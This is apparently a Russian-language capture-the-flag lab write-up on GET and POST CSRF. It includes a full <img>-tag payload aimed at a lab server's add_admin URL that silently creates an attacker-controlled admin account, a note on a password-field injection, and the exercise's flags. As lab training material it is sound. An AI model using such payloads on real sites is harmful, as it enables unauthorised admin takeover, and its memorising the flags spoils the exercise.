# **Лабораторная 5**
### Get SCRF
* Зайти под тестовыми учтными данными "GET CSRF- testuser1/testpass1", ->Add Admin user и добавить админа с данными "shimishimie/shalalal". На панели разработчика во вкладке "Сеть" скопировать url запроса при создании админа "http://92.124.140.111:1337/add_admin?username=shimishimie&password=shalalal&isAdmin=yes&submit=Add+User". После этого, в message board прокинуть фото с этим url "<img src="http://92.124.140.111:1337/add_admin?username=shimishimie&password=shalalal&isAdmin=yes&submit=Add+User">". Выйти и зайти за админа и получить в флаге: "NOW_YOU_KNOW_GET_CSRF"
* Создать html файл стаким же тектом '<img src="http://92.124.140.111:1337/add_admin?username=shimishimie&password=shalalal&isAdmin=yes&submit=Add+User">'
* Если при создании нового админа логин оставить упстым, а в пароль ввести "<img src="http://92.124.140.111:1337/add_admin?username=shimishimie&password=shalalal&isAdmin=yes&submit=Add+User">", то тогда админ все равно создастся

### **Post SCRF**
Создать форму, которая была подготовлена в отдельном HTML-файле. Она содержала скрытые поля, имитирующие параметры запроса, которые сервер ожидал от пользователя. Загрузить, и зайдя за админа получить флаг: "DID_YOU_LIKE_POST_CSRF"

